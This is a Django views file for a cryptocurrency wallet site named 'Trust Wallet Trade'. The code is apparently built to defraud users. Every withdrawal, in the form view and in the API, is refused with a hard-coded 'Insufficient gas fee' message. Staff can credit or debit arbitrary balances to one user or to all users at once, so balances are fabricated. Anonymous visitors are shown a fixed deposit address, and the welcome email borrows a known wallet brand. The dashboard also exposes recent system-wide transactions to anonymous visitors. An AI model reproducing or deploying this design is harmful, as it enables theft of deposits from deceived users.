from django.contrib import messages
from django.contrib.auth import login
from django.contrib.auth.forms import AuthenticationForm
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.auth.models import User
from django.contrib.auth.views import LoginView, LogoutView
from django.conf import settings
from django.core.mail import send_mail
from django.urls import reverse_lazy
from django.shortcuts import redirect
from django.views.generic import CreateView, TemplateView, FormView, ListView
from django.db import transaction
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_protect

from .forms import UserRegisterForm, TransactionForm, AdminDepositForm
from .models import AdminDeposit, Transaction, Wallet
from .serializers import WalletSerializer, TransactionSerializer

from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import IsAuthenticated
from rest_framework.response import Response


class WalletDashboardView(TemplateView):
    template_name = "wallet/dashboard.html"

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        # For chart, use all system transactions only for anonymous visitors.
        all_transactions = Transaction.objects.all().order_by("-created_at")[:50]
        context["deposit_address"] = settings.FIXED_WALLET_ADDRESS

        if self.request.user.is_authenticated:
            wallet, _ = Wallet.objects.get_or_create(user=self.request.user)
            context["wallet"] = wallet
            context["deposit_address"] = wallet.get_deposit_address()
            if self.request.user.is_staff:
                admin_transactions = Transaction.objects.select_related("wallet__user").order_by("-created_at")[:50]
                context["recent_transactions"] = admin_transactions
                context["has_deposits"] = admin_transactions.exists()
                context["all_transactions"] = admin_transactions
            else:
                user_transactions = Transaction.objects.filter(wallet__user=self.request.user).order_by("-created_at")[:50]
                context["recent_transactions"] = user_transactions
                context["has_deposits"] = user_transactions.exists()
                context["all_transactions"] = user_transactions
        else:
            context["wallet"] = None
            context["recent_transactions"] = all_transactions
            context["has_deposits"] = False
            context["all_transactions"] = all_transactions
        return context


class RegisterView(CreateView):
    template_name = "wallet/register.html"
    form_class = UserRegisterForm
    success_url = reverse_lazy("wallet:login")

    email_subject = "Welcome to Trust Wallet"
    email_body = (
        "Hi {username},\n\n"
        "Your Trust Wallet Trade account has been created successfully.\n"
        "You can now log in and start using your wallet.\n\n"
        "Log in here: {login_url}\n\n"
        "Thank you for joining Trust Wallet Trade.\n"
    )

    def form_valid(self, form):
        self.object = form.save()
        login_url = self.request.build_absolute_uri(reverse_lazy("wallet:login"))
        message = self.email_body.format(username=self.object.username, login_url=login_url)

        send_mail(self.email_subject, message, settings.DEFAULT_FROM_EMAIL, [self.object.email])
        messages.success(self.request, "Registration complete. Check your email for confirmation.")
        return redirect(self.success_url)

    def form_invalid(self, form):
        messages.error(self.request, "Account could not be created. Please correct the errors below.")
        return super().form_invalid(form)


class CustomLoginView(LoginView):
    template_name = "registration/login.html"
    redirect_authenticated_user = True

    def get_success_url(self):
        url = super().get_success_url()
        if self.request.user.is_staff:
            return url or reverse_lazy("admin:index")
        return url or reverse_lazy("wallet:dashboard")


class CustomLogoutView(LogoutView):
    next_page = reverse_lazy("wallet:login")


class AdminRequiredMixin:
    def dispatch(self, request, *args, **kwargs):
        if not request.user.is_staff:
            messages.error(request, "Admin access required to add balance.")
            return redirect("wallet:dashboard")
        return super().dispatch(request, *args, **kwargs)


class WithdrawView(LoginRequiredMixin, FormView):
    template_name = "wallet/withdraw.html"
    form_class = TransactionForm
    success_url = reverse_lazy("wallet:dashboard")

    def form_valid(self, form):
        error_msg = "Insufficient gas fee"
        messages.error(self.request, error_msg)
        form.add_error("amount", error_msg)
        return self.form_invalid(form)


class DepositView(LoginRequiredMixin, AdminRequiredMixin, FormView):
    template_name = "wallet/deposit.html"
    form_class = AdminDepositForm
    success_url = reverse_lazy("wallet:dashboard")

    def form_valid(self, form):
        user = form.cleaned_data["user"]
        amount = form.cleaned_data["amount"]
        try:
            with transaction.atomic():
                transaction_type = form.cleaned_data["transaction_type"]
                if user is None:
                    users = User.objects.all()
                    if not users.exists():
                        raise ValueError("No users found to apply this transaction.")
                    for user_item in users:
                        AdminDeposit.objects.create(
                            user=user_item,
                            admin=self.request.user,
                            transaction_type=transaction_type,
                            amount=amount,
                            note=f"Admin {transaction_type} to {user_item.username}",
                        )
                    action = "deposited to" if transaction_type == "deposit" else "withdrawn from"
                    messages.success(self.request, f"{amount} {action} all users successfully.")
                else:
                    AdminDeposit.objects.create(
                        user=user,
                        admin=self.request.user,
                        transaction_type=transaction_type,
                        amount=amount,
                        note=f"Admin {transaction_type} to {user.username}",
                    )
                    action = "Deposited to" if transaction_type == "deposit" else "Withdrawn from"
                    messages.success(self.request, f"{action} {user.username} successfully.")
        except ValueError as exc:
            form.add_error("amount", str(exc))
            return self.form_invalid(form)
        return super().form_valid(form)


class TransactionHistoryView(LoginRequiredMixin, ListView):
    template_name = "wallet/transaction_history.html"
    context_object_name = "transactions"
    paginate_by = 20
    login_url = reverse_lazy("wallet:login")

    def get_queryset(self):
        # Admin users see all transactions in the system
        if self.request.user.is_staff:
            return Transaction.objects.all().order_by("-created_at")
        return Transaction.objects.filter(wallet__user=self.request.user).order_by("-created_at")
    
    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context["is_admin"] = self.request.user.is_staff
        return context


@api_view(["GET"])
@permission_classes([IsAuthenticated])
def wallet_api(request):
    wallet, _ = Wallet.objects.get_or_create(user=request.user)
    serializer = WalletSerializer(wallet)
    return Response(serializer.data)


@api_view(["GET"])
@permission_classes([IsAuthenticated])
def transactions_api(request):
    wallet, _ = Wallet.objects.get_or_create(user=request.user)
    transactions = wallet.transactions.all()
    serializer = TransactionSerializer(transactions, many=True)
    return Response(serializer.data)


@api_view(["POST"])
@permission_classes([IsAuthenticated])
def deposit_api(request):
    if not request.user.is_staff:
        return Response({"detail": "Admin access required."}, status=status.HTTP_403_FORBIDDEN)

    amount = request.data.get("amount")
    if amount is None:
        return Response({"detail": "Amount is required."}, status=status.HTTP_400_BAD_REQUEST)
    try:
        amount = float(amount)
        with transaction.atomic():
            wallet, _ = Wallet.objects.get_or_create(user=request.user)
            wallet.deposit(amount)
    except ValueError as exc:
        return Response({"detail": str(exc)}, status=status.HTTP_400_BAD_REQUEST)
    return Response({"detail": "Deposit successful."}, status=status.HTTP_200_OK)


@api_view(["POST"])
@permission_classes([IsAuthenticated])
def withdraw_api(request):
    return Response({"detail": "Insufficient gas fee"}, status=status.HTTP_400_BAD_REQUEST)
